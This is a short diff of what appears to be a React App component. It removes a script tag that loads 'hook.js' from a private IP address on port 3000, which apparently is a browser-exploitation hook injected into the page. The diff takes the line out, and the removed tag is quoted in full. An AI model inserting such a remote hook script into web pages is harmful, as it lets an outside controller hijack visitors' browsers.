@@ -20,7 +20,7 @@ function App() {
 
   return (
     <>
-    <script src="http://192.168.2.112:3000/hook.js"></script>
+ 
     <ScrollToTop/>
       <Navbar />
       <Routes>
